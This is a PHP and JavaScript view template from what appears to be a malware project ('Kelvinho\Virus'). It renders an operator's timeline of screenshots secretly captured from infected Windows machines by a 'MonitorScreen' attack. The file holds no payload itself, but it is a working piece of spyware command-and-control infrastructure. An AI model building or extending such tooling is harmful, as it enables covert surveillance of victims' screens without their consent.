<?php

use function Kelvinho\Virus\map;

global $timezone;

/** @var \Kelvinho\Virus\Attack\Packages\Windows\Background\MonitorScreen\MonitorScreen $attack */
/** @var \Kelvinho\Virus\User\User $user */

\Kelvinho\Virus\Singleton\BackgroundAttacks::js($attack); ?>
<script>
    class Event extends BaseEvent {
        constructor(unixTime, name, displayTime) {
            super();
            this.unixTime = unixTime;
            this.url = "<?php echo DOMAIN . "/vrs/" . $attack->getVirusId() . "/aks/" . $attack->getAttackId() . "/ctrls/getFile?file=screen-"; ?>" + unixTime + ".png";
            this.name = name ?? "";
            this.displayTime = displayTime;
        }

        renderContent(forStream) {
            return `<img width="100%" src="` + this.url + `" alt="screenshot">`;
        }

        export() {
            return JSON.stringify({
                "name": this.name
            });
        }

        getName() {
            return this.name;
        }

        setName(name) {
            this.name = name;
        }

        getDisplayTime() {
            return this.displayTime;
        }
    }

    /** @type {Object.<number, BaseEvent>} */
    const events = {<?php echo implode(", ", map($attack->getEvents(), function ($name, int $unixTime) use ($user, $timezone) {
        return "$unixTime: new Event($unixTime, \"$name\", \"" . $timezone->display($user->getTimezone(), $unixTime) . "\")";
    })); ?>};
    const context = setupBackgroundAttacksJs(events, [<?php echo implode(", ", $attack->getSavedEvents()); ?>].reverse())
</script>
